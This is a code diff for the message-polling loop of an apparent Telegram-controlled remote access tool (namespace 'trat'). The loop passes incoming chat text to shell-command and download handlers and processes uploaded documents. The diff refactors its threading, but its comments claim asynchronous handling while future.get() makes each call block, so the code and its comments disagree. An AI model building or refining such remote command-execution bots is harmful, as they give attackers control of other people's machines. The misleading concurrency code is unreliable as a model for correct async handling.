@@ -2,6 +2,7 @@
 #include "../../include/bot.hpp"
 #include <chrono>
 #include <thread>
+#include <future> // For async handling
 
 namespace trat
 {
@@ -20,6 +21,7 @@ namespace trat
         std::this_thread::sleep_for(std::chrono::seconds(1));
         continue;
       }
+
       for (int i = 0; i < count; ++i)
       {
         const auto& update = updates[i];
@@ -28,38 +30,45 @@ namespace trat
           const auto& message = update.message;
           auto message_text = message.text;
           auto message_document = message.document;
-          //auto message_photo = message.photos;          
-          if (this -> checkIfCommand(message_text)) 
-          // If the message has text in it, invoke those text related methods.
+
+          if (this->checkIfCommand(message_text)) 
           {
-            this -> handleShellCommand(message_text);
-            this -> handleDownloadCommand(message_text);
+            // Handle commands synchronously
+            this->handleShellCommand(message_text);
+            this->handleDownloadCommand(message_text);
           }
           else 
           {
-            /* This runs on a detached thread, because as soon as the program realized that this is not command, it must fetch next 
-             * This ensures  that the client recieves the reponse, and the program has already recieved an update */ 
-            std::thread
-              ([this]()
-                {
-                  this -> sendMessage("This is not a valid command");
-                }
-              ).detach();
+            // Handle non-command message asynchronously, and capture the returned future
+            auto future = std::async(std::launch::async, [this]()
+            {
+              this->sendMessage("This is not a valid command");
+            });
+            // You can handle the future if you need to, or simply discard it if you don't care about the result
+            future.get(); // This ensures we consume the result and prevent the warning.
           }
+
           if (message_document)
           {
-            std::thread(
-                [this, message_document]()
-                {
-                  this -> handleDocuments(message_document);
-                }
-                ).detach();  
+            // Handle document asynchronously, and capture the returned future
+            auto future = std::async(std::launch::async, [this, message_document]()
+            {
+              this->handleDocuments(message_document);
+            });
+            // Consume the future result to avoid the warning
+            future.get();
           }
-          offset = updates[i].update_id + 1;
+
+          // Update the offset after processing
+          offset = update.update_id + 1;
+
+          // To prevent busy-waiting
           std::this_thread::sleep_for(std::chrono::milliseconds(1));
         }
-        telebot_put_updates(updates, count);
       }
+
+      // Clean up the updates array to avoid memory leaks
+      telebot_put_updates(updates, count);
     }
   }
 }
